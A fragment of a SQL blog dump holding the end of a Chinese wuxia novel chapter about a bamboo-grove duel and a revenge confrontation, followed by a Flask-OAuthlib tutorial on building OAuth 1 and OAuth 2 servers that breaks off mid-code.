老者嘀咕了声，又向言公子两个道，“寒舍不远，就在前面。”说着便加紧脚步，鹤飞一般，全然不似先前的佝偻形态，正与他那一身的装束合为一体，羽化登仙。\n言公子再次负起溆茗，脚下不停，紧跟上老者，心里疑惑道：“这隐机子所使的倒不似轻功。奇怪，奇怪。”\n\n苏子曰：可使食无肉，不可居无竹。\n隐机子乃是雅士，自然深信这“不可居无竹”之劝。竹，历来就颇受文人雅士好评，一代一代的风雅之士口相传颂，即使它本身并不美好，现在也应该美好了。何况竹本身确有其高雅的风姿，一片翠微，风鸣竹间，令人望之脱俗，闻之登仙。\n他们行至一片竹林，隐机子缓步下来，似乎怕打扰了这份静谧，他顾道：“寒舍便在此间，请。”\n至竹林深处，突然现出一片空地来，于空地上现出一座小竹屋来。一人端坐屋前，手持羽扇，小炉清烟，炉上壶鸣，一人一桌一炉茶水，瀹茗竹间。\n这人一身青翠，布弁，箭袖，绦巾，长裤，布履，无一不是竹青之色，若是隐匿竹间，几可避敌。他朝溆茗这边睃了一眼，笑道：“大哥真把他给请来了！但不知这位姑娘是谁？”\n隐机子笑道：“不相干。言公子尊老，自然是不肯拒绝我的——请。”说着便将他们让进屋里。\n言公子也笑了，“孤竹子竟也在这里！看来今天是走不了了。老先生，在下还是不进去的好，屋外宽敞，而况孤竹子也在屋外。”\n隐机子也就止步了。屋外还有几张小竹杌子，他勾下身来挪了挪，递与言公子与溆茗。\n言公子接过便坐了下来，道：“先生有何赐教，不妨早说。”\n孤竹子忽然接道：“大哥倒没什么赐教，只不过想请尊兄在这里长住些时候。”\n言公子笑道：“但不知先生可有这本事请得在下？”\n隐机子不禁动容，叹道：“公子还是先坐会儿，待到夕阳西下时你我再一决高下，何妨？与公子这样清雅之人交手，必然得在清雅时分，而一天之中，至清至雅之时便在这夕阳西下之时。古人诗云：‘仗剑红尘笑斜阳，疏雨江南岸两茫。’岂不快哉！”\n言公子笑道：“便依先生何妨！只可惜你我并不用剑。”\n\n晚照，碧空，翠竹。\n言公子站起身来，右手一摊，向隐机子道：“请。”\n隐机子伴着一阵咳嗽声站起，“只望公子在此屈居六年，我也不敢奢求过多，望这六年里可以洗去公子身上的唳气，不至再伤人无辜。”\n言公子叹道：“在下所杀之人皆是可杀之人，并无太大过错，先生何至于此！”\n隐机子道：“世上本无非杀不可之人，公子此举大干人和。闲言少叙，公子若能在一个时辰内捉住我的衣襟，我也不敢再强留公子了。公子可看到地上的九个圈了？我便落于这九个圈中。若是我落在了圈外，也算我输。公子意下如何？”\n这九个圈画在地上并不明显，圈很小，不过碗大一点，可是很圆很圆，似远观的太阳的圆形，散落于此间，只是零乱，不得要领。\n言公子道：“这倒不用了，先生只要不出这片空地便可。”\n隐机子笑道：“公子眼睛倒厉害，看出我这阵法的厉害了，我也就不便占公子的便宜，就依公子所言。——麻烦沈兄弟为我们弹奏一曲。”\n孤竹子应了声，自己便进屋取琴，而后长凳轻骑，抱琴于膝，调过弦后便开始弹奏起来。琴音瑟瑟，似一缕清风，抚过空寂的山间，抚过山涧的溪流，又跟随溪流而下，一路的怪石嶙峋，风吹浪，浪拍石，石鸣中天——不是石鸣，是鹤唳。便是这一声鹤唳，言公子出手了，借了这声音，真如鹤飞一般，向隐机子击去。\n微风入竹林。风声，琴声，啸声，天籁与人籁的共鸣，是一首诗，可是这诗里满怀了杀意，漫布竹间。溆茗盯着场中的两人，她自然是希望言公子可以胜过这糟老头子，但是现在不行，言公子必须得败。她一眨不眨地盯着两人，看言公子出手，看他的衣衫飞舞着，鼓动着的淡桃色映衬竹间，红与翠的默契相合，他不击则罢，这一击竟似必中的。\n但是没有。她看到隐机子佝偻的身子在风中摇了摇，丝绸般随风摇曳，完全不是自己在动，倒真似被风吹动着，他竟然仿佛是飘在空中的！溆茗不禁震在了那里。\n琴音澎湃，还是风声，但是已经是狂风了，风吹过松林，呼呼然作响，散落一地的松针，这松针又随了狂风纷飞，不知飞向何方。\n飞向何方，何方是家乡。\n风渐小，一点一点熄下来，是怡人的微风。琴音缓，缓缓入竹林。这琴音正与此情此景若合一契，混然天成，亦是微风吹拂着竹林的声响。不知是天籁知人籁，还是人籁赏天籁。\n琴已歇，可是言公子仍如鹤飞，却无论怎样也不能碰到隐机子。隐机子飘于风中，任由这微风的摆弄，他现在不是他自己，他乃是这竹林的生命，和风和竹一起，筑起竹林的生命，风助他，竹亦助他。言公子等于在同整个的竹林作战，他怎么战得过！纵使战得过，他也不能战——这只能闹得玉石俱焚。\n所以他停了下来，抱拳而立，道：“武林传闻，隐机子武功卓绝，看来此话不假；武林中又传闻，隐机子根本不会武功，看来此话亦不假。二十年来，先生一直是个神话，原来竟是如此，在下佩服。古人尝云列子御风而行，我尚不肯相信。今日看来，是我孤陋寡闻了。依先生这般，何止御风而行！古人曾不我欺呀！既是如此，先生要留在下，在下恭敬不如从命，就依先生所言。”\n隐机子仍如绸般舞于空中，道：“如此甚好。沈兄弟，我们这就去吧。”说着便随了这阵风飘向林外，不见踪影。言公子叹道：“这阵法确实厉害。”他知道，如果真有了那九个圈，他会更多的留意那些圈，猜测隐机子将落于何圈，可是自他那一击开始，隐机子竟不曾落地，所以隐机子根本不必理会自己落于何圈，而他则又要多分些心了。\n孤竹子束好琴，将琴收入屋中，整理了一番，出来同言公子道别，“竹屋下面有储藏室，每七日定有人送粮食过来，可储于此。窑里有酒，言兄若是不愿喝酒，窑里亦有往年收的雨水与雪水，言兄可以煮茶，那就告辞了。姑娘，我们这就走吧。”\n溆茗望言公子道：“我留下来陪你，你愿不愿意？”\n言公子没有说话。沉默那就是默认了咯，溆茗转头来笑道：“我不走，我留下来陪他。”\n孤竹子叹了口气，朝溆茗望了两眼，衣襟一摆，轻功展开，倏然而逝。\n溆茗拉了拉言公子的手，望他道：“进屋去吧。我做饭给你吃。”可是她过去是小姐，即使流落街头也没有轮上她自己做饭给自己吃，她又拉了拉言公子的手，害羞道：“这可是我第一次做饭。”她想，她又要多一个第一次的经历了。\n言公子皱了皱眉头，叹了叹气，也就进屋去了。他可不愿意做别人的实验品，所以他自己做饭，他为她做饭。\n\n鸣翠依旧喜欢月亮，尤其喜欢圆月。可是多半的时候并没有圆月，月是如钩的，勾起了多少回忆，多少相思泪呵！喜欢圆月，大概也是因为圆月之不可多得吧。现在月如钩，鸣翠依旧倚朱楼，凭栏而望那一弯银月。夜是墨浸的一块白布，零零落落地几点星是幕布的底色中未被墨染的点点滴滴。\n也还是在这样的夜晚，算起来似乎已经六年了，她小姐就是在这样的夜里离去的。这六年里，多少的悲欢离合演绎着，多少的欢声笑语酩酊着，可是府里依旧是府里的生活，一成不变，任岁月一点一点侵蚀。\n在这一成不变里唯一变化着的只有鸣微，她做了楚王那傻儿子的妃子了，一下从奴仆变作了奴仆的主人，她们也就此失去了联系。鸣翠低下头来，似乎竟嫉妒起鸣微来，她不要就这样一辈子白搭在府里，成日里被呼来唤去的，然后嫁给一个男仆，然后再待在府里做老妈子，这不是她想要的，人生需要些许不同的经历。\n她忽而莫名的兴奋起来，“既然小姐可以逃走，为什么我不可以呢！”\n这大胆的想法萦绕心间，诱惑着她，她愈想愈是后悔，当初就应该跟着小姐一起出逃的，但是就算是现在，那也不算太迟，毕竟她还没有嫁人。鸣翠望着那钩月，终于下定了决心。\n出走并不难，难的是出走以后的谋生。她不像她小姐，可以带出一大堆盘缠，她知道分寸，她只带上属于自己的衣物，也许是为以后留下后路，免得落下盗窃的口垢，纵然穷途后想回来也是不可能了。\n夜深，人亦静。\n荆州不如扬州般柔情，扬州的夜是温柔乡胭脂坊，荆州的夜永远都如战士般冷清冷静，是战场上的肃穆——只是没有战士。鸣翠一个人走在大街上，只有自己的脚步声同天幕的弯月伴随着她；她听着这声音，望着那弯月，这才暂时忘却了孤独，忘却了这骇人的寂静的夜。\n太平盛世里的城，永远都是脆弱的，禁不起敌人的攻击。城门大开，没有守城的兵，鸣翠就这样轻轻松松地出了城，一路向南走去。她这时一身青布衣，灰土裤子，小帽，布履，近于男子的装束，肩负着青花纹的布包袱，步履轻快。\n郊外自然本该更见清静，但是偶而还有虫鸣有草动，鸣翠在月光里走了一程，前面竟然热闹了起来，依稀见到了几点灯火。\n是一片空林地，近百人围着一个圈，也不知在做什么游戏。鸣翠踌躇了些时候，觉得去打扰他们总是不太好，并且看那些人的架势，倒并不好惹；然而她还是按捺不住内心的好奇心，她竟一点一点向那里逼近，偷偷猫在一棵大树旁。\n鸣翠的眼睛真好，她竟依稀觉得圈子里被围着的是她小姐李溆茗。\n\n被围着的并不只溆茗，还有言公子，还有她同言公子的小公子。\n言公子仍旧是一袭淡桃色无绣丝制长袍，拦腰一围浅黄色丝巾玉绦，下面是灰白描翠的裤子，脚蹬土色布履，也依旧不曾束冠，形容俊雅。溆茗一身白，白帽白衣白裙白履，是隐机子留下的衣物，她手里牵着小孩子，依傍在言公子身旁。\n小孩子突然道：“妈妈，我饿了，我要吃饭饭。”\n溆茗低头看了看他，抬手抚摸起他的头，轻声道：“丹青，乖。等爸爸办完了事，妈妈给你买糖糖吃。”\n小孩子听见有糖吃，果然不再闹了，很乖顺地挨着他母亲，静待这莫名的游戏的结束。他是这次出门后才吃过糖的，第一次吃糖便喜欢上了糖果。现在那些大叔叔大婶婶们围着一个圈是做什么呢？他啃起指甲，仔细琢磨起来，然而想破了小脑袋也想不明白。\n言公子开口道：“各位错了，大错特错。既然挑在了晚上，那就不该在今天晚上。既然挑在了今天晚上，就不应该到这时还不出手。既然到这时还不出手，那我们妻儿可就要走了。”\n“姓言的，你以为今天走得了么！六年前我师兄惨死于你手下，今日我便要为他报仇，以慰我师兄的在天之灵。”说话的是一个矮小精悍的白面小生，手执一把山河图的纸扇，一脸激愤而又偏偏装得从容镇定。\n一石激起千层浪，他这一句话可谓是抛砖引玉，大伙儿马上就沸腾了，纷纷怒喝起来，有人道，“还我师傅命来”，还有人道，“还家父命来”，还有人道，“我要为我丈夫报仇”，但是更多的人只是辱骂，从言公子的祖宗十八代骂到孙子十八代，仿佛这样可以杀掉言公子似的，偏偏就没人敢上前动手，因为谁也不想第一个送命。\n言公子叹道：“哎，冤冤相报何时了。各位又何必如此执著？我本意是想放各位一条生路，为什么各位就不肯给我这个机会呢？”\n众人不免一笑。一位老先生站出来道：“姓言的，你休出狂言。我等百人，难道竟奈何不了你么！你还是束手就擒的好。我担保绝不为难你妻儿。”\n“怎么能放过他们！斩草要除根。”\n“血债需血偿，杀他妻儿也不为过。”……\n老先生面色如铁，厉喝道：“老夫说过不许为难他妻儿，众位没长耳朵么！”\n“阎老鬼，你以为你是谁呀。你这个阎可不是他那个言，没必要去维护他吧。所谓民意不可违，老鬼你还是省省吧。”\n“阎罗清，你哪根葱？你说话就是圣旨了？就是圣旨，老子也把它当个屁！给老子滚一边去。”说话的是一个油光满面的胖子。\n阎罗清一阵狂啸，大喝一声：“找死！”右手如爪，直扑过去。那人毫无防备，不禁一谔，便在此时，喉头已入了阎罗清之手，只需阎罗清稍一用力，他这喉头怕是不保；眼见危在旦息，他不由得全身酸软，说不出话来，看来这人只是口上功夫厉害的草包。\n阎罗清笑道：“无知狂徒，老夫说不许为难他妻儿便是不许为难他妻儿。”他那一身黑衣劲装伴了这夜色再加了他诡异的身手再与他鹰一般的眼睛相合，众人只觉心里一寒。阎罗清心下不免得意，他自从死了弟弟后便狠下心来刻苦习武，六年来闭门不出，武功精进也是意料中的事，这次一试，果真不可与过去同日而语。\n人一高兴就忘乎所以，这是不变的真理。阎罗清正自得意，他的手便已被人从那喉头卸下，又给人紧握在了手里，他扭头一看，是一个和尚。武林中人一见了会武功的和尚便以为是少林寺的和尚，这想法在绝大部分时候是对的，言公子却知道这和尚不是，他根本就没到北方去过，也不至于得罪少林寺的人。\n但是言公子猜错了，这和尚偏偏就是少林寺的。只听阎罗清道：“原来是少林寺的空明和尚，失敬，失敬。”便这两声“失敬”，他手一缩，已经从空明手里脱了出来。\n空明和尚笑道：“阎施主慈悲，和尚钦佩。然劲敌尚还未除，我等便已生内讧，不免使敌人有可趁之机。阎施主所言甚是，和尚担保没人敢去伤他妻儿。”\n言公子重重的叹了口气，道：“各位为了在下而伤和气，在下实在觉得愧疚，即是如此，在下这条命赠与各位又有何妨。且容我与妻子说几句话。”他说着便俯到溆茗耳边嘀咕了几声。溆茗不禁脸上起了红晕，咬了咬唇，低下头轻声问道：“真要这样么，星哥？”\n言公子点了点头，然后便解了玉绦，散开这一身的淡桃红的长袍，露出如女子的白净的胸脯，他竟只穿了这一件长袍。溆茗犹豫了些时候，两眼注视着言公子，可是，他并没有改变想法的意思，她也只好解了衣襟。\n众人眼见了这等奇事，不禁大骇，以为言公子要施展什么法术了；又眼见了溆茗一件一件卸去了衣衫，不禁色心大起，直愣愣地瞧着她，也懒得再理会言公子的法术了。\n等溆茗脱去了里背心，言公子便给她披上了自己的那件长袍。淡桃红的衣裳，衬着淡桃红的面颊，溆茗脸上一阵滚烫。言公子紧握住溆茗的手，在她滚烫的面颊上吻了一下，又俯到她耳边嘱咐了几句。\n溆茗点了点头，眼角沁出泪来，已经哽咽了，她哑声道：“你真的不顾我们了么？”\n言公子依旧握着溆茗的手，面容越发白净了。\n他抬头向众位武林人士道：“各位可知在下为何要取各位亲友性命？只因在下喜欢他们的血。世人多有收集的嗜好，在下亦然；有的人喜欢收集石头，有的人喜欢收集树叶，有的人喜欢收集宝剑，有的人喜欢收集金银，还有的人喜欢收集女子，在下不才，在下的嗜好便是收集人血，只可惜到目前为此才收集到一百三十六人之血。懂得收集的人必然知道，收集倘若不收集珍奇的事物，还不若不收集！在下若要收集，自然会收集那些比较有名望一点的武林君子的血，也就是各位的亲友的血。在下所求也并不过份，只不过一滴血而已，但是向他们求这一滴血实在比登天还难！世人只知道流血是一件很痛苦的事，他们不愿意承受这痛苦，在下求之不得，也曾心下悔恨，自己亦觉得过于自私了，怎么可以将自己的快乐建立在别人的痛苦之上呢！然而偏偏又有了这么个嗜好，也没有办法。于是在下便想到了一个一举两得的方法，既可以满足在下的嗜好，又可以免除他人的痛苦。现在想来，在下还是错了。在下只考虑到流血之人的痛苦，而没有考虑到流血之人的亲友的痛苦，大错特错。为了弥补在下的过错，在下本来亦准备解决各位的痛苦。但是现下又改变主意了，只怕解决了各位的痛苦，各位的亲友便又痛苦起来。罢了罢了，索性还在下大方一点吧……”\n言公子说着，忽而飞跃而起，到得一黑衣女子身前，剪手夺过她手里的匕首，便又退至中间，匕首便已插在了他白净的胸膛上。血沿着匕首一点一点滴下来，在这如烟的空气中凝聚，又一滴一滴溅在草地上。\n众人面面相觑，左右顾盼，实难理解这一幕。他们看着言公子流血，看着他的血落在地上，又看着他倒在了地上，可是言公子却依旧嘴角含笑着。\n空明和尚双手合十，拜了一拜，默念数语向各位道：“既然此人已死，我们走吧。”\n胖子问道：“那这两个人呢？”\n阎罗清不禁动怒道：“空明和尚说过放这二人一条生路，各位没有听见么！”\n溆茗哼了哼，笑道：“各位就真这样走了？”\n阎罗清安慰道：“姑娘，在下担保没人敢伤姑娘。姑娘这就回去吧。”\n溆茗冷眼瞪着他，哼道：“刚才……刚才你都看见了？”\n众人纷纷笑起来，遇了这样的事，大家不去瞧仔细了，难道还会闭着眼睛不成？阎罗清想了想，若说看见了，别人姑娘脸上不好看，若说没看见吧，那又是自欺欺人，思量一二，他也只好点了点头。\n溆茗叹道：“既是如此，各位就想这样走了么！还是留下各位的眼睛再走吧！”\n众人又是一笑，这姑娘说话简直是不知天高地厚！在这笑声中，溆茗长袖飞舞，跳动着脚步，踏着这笑声的旋律起落盘旋。众人冷眼瞧着，然而只是一瞬，就再也瞧不见了，血水与黑水从众人眼中激射出来，溅到溆茗的衣袖上，在衣袖上渗透，然后混为一体，淡桃色的长袍越染越深，变作桃色长袍，而后又变作梅色长袍。\n在这一片嚎叫声里，十多盏灯笼飞散出去，在空中划出几记华美的淡黄的弧迹，落在了地上。溆茗牵起小孩子，一个飞跃，落在鸣翠身边，一把掐住她肩胛。鸣翠“啊”地尖叫了一声，道：“小姐，是我！”\n溆茗这才认清，便放开了手。鸣翠蹲下来摸了摸小孩子的头，问道：“这位是小少爷？”\n溆茗点了点头，“走吧。鸣翠，你也跟我们一起去吧。”\n鸣翠犹豫着，可是还是点头同意了，她望那边看去，道：“那姑爷的尸体呢？”\n溆茗神色黯然，摇了摇头，“算了，不管他了。这就走吧，我实在懒得见到这些人。”', NULL, NULL, NULL);
INSERT INTO `post` (`id`, `url`, `title`, `content`, `created_at`, `blog_id`, `updated_at`, `published_at`, `hide`, `keywords`, `clicks`, `recommend`, `pure_content`, `need_analysis`, `published_at_exceed`, `updated_at_exceed`) VALUES
(40, 'http://lepture.com/en/2013/create-oauth-server', 'Create an OAuth Server', '<p>I''ve searched the whole internet on how to create an OAuth server or\nprovider, but failed every time. Sometimes it was the language that stopped\nme, and sometimes it was something that didn''t even work.</p>\n<p>And one day, I found <a href="https://github.com/ib-lundgren/flask-oauthprovider">Flask-OAuthProvider</a>, which was a\ngreat piece of work. But it only implements the OAuth 1 server, and I need\nthe OAuth 2 part at that time. This was the first time I met OAuthlib.</p>\n<blockquote><p>OAuthlib is the future of OAuth for Python.</p>\n</blockquote><p>A quote from Kenneth Reitz, and I can''t agree more. It is really great and\nRFC-aware. However, it is undervalued with <del>fewer than 450</del> stars on GitHub.\nThe code of <a href="https://github.com/idan/oauthlib">OAuthlib</a> is well written, so is the documentation,\nand so is the test cases. You should star it. Everything is perfect, except\nits fame. That''s why I sent <a href="https://github.com/aaronpk/oauth.net/pull/55">a pull request</a> to oauth.net,\nmaking it known by the world.</p>\n<p>OAuthlib is far more brilliant than rauth. It is a generic, spec-compliant\nlibrary, without any specific HTTP request library. It focuses on the\ndefinition of RFCs.</p>\n<h2>Flask-OAuthlib</h2>\n<p>It has been 6 months since I started this project named as <a href="https://github.com/lepture/flask-oauthlib">Flask-OAuthlib</a>, which is a successor of Flask-OAuthProvider and Flask-OAuth.</p>\n<p>With the great work of OAuthlib, I finished the client part in 4 days, and\nmade it a replacement of Flask-OAuth. It is well designed with a good\nintention for compatability of the non-standard oauth servers. If you are\nstill using Flask-OAuth, I recommend you take this project into account.</p>\n<p>I completed the OAuth 2 provider part at version 0.2.0, OAuth 1 provider\nat version 0.3.0. And now this project has moved to version 0.4.0. So I\nthink it is the right time to write some introduction now.</p>\n<p>Thanks for the help of <a href="https://github.com/ib-lundgren">Ib Lundgren</a> who is the maintainer of OAuthlib.\nThanks for the contribution of Randy Topliffe and Mackenzie B. Thompson.\nYou can find them on the <a href="https://flask-oauthlib.readthedocs.org/en/latest/authors.html">authors list</a>.</p>\n<h2>Terminology &amp; Knowledge</h2>\n<p>There are knowledge and terminologies that you should know. We will build\na server in Flask web framework, it is okay even if you haven''t used Flask.\nYou can still learn something that worth the time.</p>\n<p>Since you are going to build an OAuth server, you may need some knowledge\non these terminologies.</p>\n<ul>\n<li><strong>client</strong>: also known as application, for example Twitter for iPhone\nis a client</li>\n<li><strong>resource owner</strong>: it is usually the user of a website, for example me\non Twitter: <a href="https://twitter.com/lepture">twitter.com/lepture</a></li>\n<li><strong>access token</strong>: this is the key for a client to get resource from a\nresource owner</li>\n</ul>\n<p>There are differences between OAuth 1 and OAuth 2. A client will need some\ntemporary tokens for exchanging the final access tokens. They do have their\nown terminologies.</p>\n<h3>OAuth 1</h3>\n<p>OAuth 1 needs more temporary tokens, it has a request token, a verifier,\na timestamp and a nonce.</p>\n<ul>\n<li><strong>request token</strong>: designed for exchanging the final access token</li>\n<li><strong>verifier</strong>: designed for verifying the current authenticated user</li>\n<li><strong>timestamp</strong>: a timestamp of current request</li>\n<li><strong>nonce</strong>: a random token that makes current request unique</li>\n</ul>\n<p>All these messy things are designed for authentication and security.</p>\n<h3>OAuth 2</h3>\n<p>OAuth 2 is much easier, we do need only one <strong>grant token</strong> for exchanging\nthe final access token.</p>\n<p>OAuth 2 requires SSL over the connection for security, it simplifies the\nway for getting access token. However, SSL is also suggested on OAuth 1 in\nyour final production.</p>\n<h2>Writing a Server</h2>\n<p>We need a normal server with a user system before starting the OAuth part.\nAny site which has OAuth service has a user system.</p>\n<p>Since this is just a demo, we will not create something that big. Let''s\nthink about it, we need a user system, we need it because we want to\nidentify the current user. But we can skip the registration part.</p>\n<p>This is a basic, simple, yet functional server:</p>\n<pre><code class="lang-py"># coding: utf-8\n\nfrom flask import Flask\nfrom flask import session, request\nfrom flask import render_template, redirect\nfrom flask_sqlalchemy import SQLAlchemy\n\n\napp = Flask(__name__, template_folder=''templates'')\napp.debug = True\napp.secret_key = ''secret''\napp.config.update({\n    ''SQLALCHEMY_DATABASE_URI'': ''sqlite:///db.sqlite'',\n})\ndb = SQLAlchemy(app)\n\n\nclass User(db.Model):\n    id = db.Column(db.Integer, primary_key=True)\n    username = db.Column(db.String(40), unique=True)\n\n\ndef current_user():\n    if ''id'' in session:\n        uid = session[''id'']\n        return User.query.get(uid)\n    return None\n\n\n@app.route(''/'', methods=(''GET'', ''POST''))\ndef home():\n    if request.method == ''POST'':\n        username = request.form.get(''username'')\n        user = User.query.filter_by(username=username).first()\n        if not user:\n            user = User(username=username)\n            db.session.add(user)\n            db.session.commit()\n        session[''id''] = user.id\n        return redirect(''/'')\n    user = current_user()\n    return render_template(''home.html'', user=user)\n\n\nif __name__ == ''__main__'':\n    db.create_all()\n    app.run()</code></pre>\n<p>And this is the template of <code>home.html</code>:</p>\n<pre><code class="lang-html+jinja">&lt;!DOCTYPE html&gt;\n&lt;html lang=&quot;en&quot;&gt;\n&lt;head&gt;\n  &lt;meta charset=&quot;UTF-8&quot;&gt;\n  &lt;title&gt;&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n  {% if user %}\n    &lt;p&gt;You are {{ user.username }}&lt;/p&gt;\n  {% else %}\n    &lt;p&gt;You are not authenticated&lt;/p&gt;\n  {% endif %}\n\n  &lt;p&gt;Type any username:&lt;/p&gt;\n  &lt;form method=&quot;post&quot; action=&quot;/&quot;&gt;\n    &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;\n    &lt;input type=&quot;submit&quot;&gt;\n  &lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;</code></pre>\n<p>You can download these files from this <a href="https://github.com/lepture/example-oauth1-server/tree/6cfb8db25b4427648e4229507d1649be04ddb7ef">commit#6cfb8db</a>. And I will continue working on this repo, browser the revisions for more details.</p>\n<h2>Creating OAuth 1 Server</h2>\n<p>Before implementing the actual OAuth part, we need to define an OAuth 1\nClient. A client requires client_key, client_secret, redirect_uris,\ndefault_redirect_uri and default_realms. Find more in the <a href="https://flask-oauthlib.readthedocs.org/en/latest/oauth1.html#client-application">Documentation</a>.</p>\n<p>All clients are bound to a developer (developer is a user). The developer\nneed to fill a form and describe the application. In this simple demo, we\nwill skip this part. It will create a client when you visit <code>/client</code>.</p>\n<pre><code class="lang-python">from flask import jsonify\nfrom werkzeug.security import gen_salt\n\n\nclass Client(db.Model):\n    client_key = db.Column(db.String(40), primary_key=True)\n    client_secret = db.Column(db.String(55), index=True, nullable=False)\n\n    # creator of the client\n    user_id = db.Column(db.ForeignKey(''user.id''))\n    user = db.relationship(''User'')\n    _realms = db.Column(db.Text)\n    _redirect_uris = db.Column(db.Text)\n\n    @property\n    def redirect_uris(self):\n        if self._redirect_uris:\n            return self._redirect_uris.split()\n        return []\n\n    @property\n    def default_redirect_uri(self):\n        return self.redirect_uris[0]\n\n    @property\n    def default_realms(self):\n        if self._realms:\n            return self._realms.split()\n        return []\n\n\n@app.route(''/client'')\ndef client():\n    user = current_user()\n    if not user:\n        return redirect(''/'')\n    item = Client(\n        client_key=gen_salt(40),\n        client_secret=gen_salt(50),\n        user_id=user.id,\n    )\n    db.session.add(item)\n    db.session.commit()\n    return jsonify(\n        client_key=item.client_key,\n        client_secret=item.client_secret\n    )</code></pre>\n<p>You can find the whole new code at <a href="https://github.com/lepture/example-oauth1-server/tree/2cafa624dd8e82054a5208ce7c156f024d0bb109">commit#2cafa62</a>. Now, run the script\nand visit <code>/client</code>.</p>\n<h3>Implement OAuth 1 Provider</h3>\n<p>It is time to create a provider now. However, before we initialize a\nprovider, we need to update the configuration.</p>\n<pre><code class="lang-python">app.config.update({\n    ''OAUTH1_PROVIDER_ENFORCE_SSL'': False,\n    ''OAUTH1_PROVIDER_KEY_LENGTH'': (10, 100),\n})</code></pre>\n<p>Because we are developing on a local machine, it would be easier for us\nto implement it over HTTP. This is why we set <code>OAUTH1_PROVIDER_ENFORCE_SSL</code>\nto <code>False</code>. After this, we can create a provider:</p>\n<pre><code class="lang-python">from flask_oauthlib.provider import OAuth1Provider\noauth = OAuth1Provider(app)\n\n@oauth.clientgetter\ndef load_client(client_key):\n    return Client.query.filter_by(client_key=client_key).first()</code></pre>\n<p>Check code at <a href="https://github.com/lepture/example-oauth1-server/tree/78f6cf5ebbad01694ff3d5e78ad827acfefbea86">commit#78f6cf5</a>.</p>\n<p>There will be lots of code, and they would flush this article. In this case,\nI would keep them in a repo, and create a revision every time a milestone\nfinished. You need to follow the links to view the changes.</p>\n<p>The next step is <a href="https://github.com/lepture/example-oauth1-server/commit/860850e57d7f5f07441d3019ce7cf0eaaffd0561">creating request token and verifier</a>, we did this by following the documentation of <a href="https://flask-oauthlib.readthedocs.org/en/latest/oauth1.html#request-token-and-verifier">Request Token and Verifier</a>.</p>\n<p>Like request token and verifier, we mix timestamp and nonce together.\nFind out how we <a href="https://github.com/lepture/example-oauth1-server/commit/679d9a614cf10b5769f63ac76c45fd9aecb27181">create timestamp and nonce</a>. This\nis done with the help of documentation on <a href="https://flask-oauthlib.readthedocs.org/en/latest/oauth1.html#timestamp-and-nonce">Timestamp and Nonce</a>.</p>\n<p>We will finish all the data models when <a href="https://github.com/lepture/example-oauth1-server/commit/88dee8057eb1864d90e1df1895a47efdbad4ee66">access token is created</a>.</p>\n<p>The next big thing is the handlers - how we handle the authorization flow,\nthe request token and access token. Check <a href="https://github.com/lepture/example-oauth1-server/commit/55664c43951f593efa545e8968b1371b9d01659c">commit#55664c4</a>.</p>\n<p>In this commit, we implemented all required handlers. And we also fixed\nsome bugs, added a logger for debugging. There was a change in <code>/client</code>\nhandler, we added a redirect uri data to the model, and we would use it\nlater.</p>\n<p>Now that we have finished the authorization part of OAuth 1 server, we need\na client to verify it. We created a client with Flask-OAuthlib itself at\n<a href="https://github.com/lepture/example-oauth1-server/commit/f8b1d09b17f3bbcc9ecc41b44e061185e0e87e51">commit#f8b1d09</a>.</p>\n<p>Let''s have a game. Start your provider server with:</p>\n<pre><code>$ python app.py\n\n</code></pre>\n<p>We visit <code>http://127.0.0.1:5000/</code> and fill a username. And then we visit\n<code>http://127.0.0.1:5000/client</code>, take the client key and client secret, and\nmodify our <code>client.py</code> script with the key and secret. Now, we can start\nthe client server with:</p>\n<pre><code>$ python client.py\n\n</code></pre>\n<p>We visit <code>http://localhost:8000/</code>, everything should work correctly. We\nwill be redirected to a confirm page, if we choose yes, client will obtain\na pair of access token and secret. If anything wrong happens, don''t\nhesitate to tell me. You can also debug it yourself. We enabled the\nlogging for Flask-OAuthlib so that you can debug easily.</p>\n<p>The last part of this tutorial on OAuth 1 is protecting user resources. It\nis easy with a decorator <code>require_oauth</code>:</p>\n<pre><code class="lang-python">@app.route(''/api/me'')\n@oauth.require_oauth()\ndef me(req):\n    user = req.user\n    return jsonify(username=user.username)</code></pre>\n<p><strong>CHANGED SINCE VERSION 0.5.0. YOU WILL WRITE THIS SNIPPET LIKE THIS:</strong></p>\n<pre><code class="lang-python">@app.route(''/api/me'')\n@oauth.require_oauth()\ndef me():\n    user = request.oauth.user\n    return jsonify(username=user.username)</code></pre>\n<p>This <code>req</code> parameter is an oauth request object, it contains many useful\ndata. You can learn more about it at <a href="https://flask-oauthlib.readthedocs.org/en/latest/oauth1.html#protect-resource">Protect Resource</a>.</p>\n<p>Now, find the final <code>client.py</code> at <a href="https://github.com/lepture/example-oauth1-server/commit/c3b88d0eac572bb216c3aeea6a359872866cfdb">commit#ac3b88d</a>.\nThis commit added a tokengetter, and fixed some bugs I created. After the\nclient obtained an access token, visit <code>http://localhost:8000/</code>, and you\nwill see the information of current user.</p>\n<p>There are more works we should do, but we will finish it right now.\nSince this is a simple tutorial, it will not cover any advanced skills.\nHowever, I would give some suggestions at the end of this article.</p>\n<h2>Creating OAuth 2 Server</h2>\n<p>I created OAuth 2 provider in Flask-OAuthlib before OAuth 1 provider. That\nmeans I designed the API for OAuth 2 provider first, and OAuth 1 provider\nshares the same API with OAuth 2 provider.</p>\n<p>The setup of OAuth 2 server is the same as above. First, we created a\nbasic simple server with a user system. You can find the code at\n<a href="https://github.com/lepture/example-oauth2-server/commit/d1e3b6de1982894b97a719b04d9f0161e5739074">commit#d1e3b6d</a>.</p>\n<p>Then we created a Client model and a client handler. Here are the differences,\nClient for OAuth 2 use <code>client_id</code> instead of <code>client_key</code>, <code>default_scopes</code>\ninstead of <code>default_realms</code>, and it has a client type (which is public in\nthis case). See the code at <a href="https://github.com/lepture/example-oauth2-server/commit/3f1c8f2f86b408be6105593c3206cad814dfcb73">commit#3f1c8f2</a>.\nWe created the Client following the documentation on <a href="https://flask-oauthlib.readthedocs.org/en/latest/oauth2.html#client-application">Client (Application)</a>.</p>\n<h3>Implement OAuth 2 Provider</h3>\n<p>The next step is the implementation for OAuth 2 Provider since we have\nfinished all preparation works. It is the same as OAuth 1 provider, except\nwe don''t have to make any configuration. via <a href="https://github.com/lepture/example-oauth2-server/commit/3b60b5d769b807b1549157f76cd46151dd3b8f1d">commit#3b60b5d</a>.</p>\n<pre><code class="lang-python">from flask_oauthlib.provider import OAuth2Provider\noauth = OAuth2Provider(app)\n\n@oauth.clientgetter\ndef load_client(client_id):\n    return 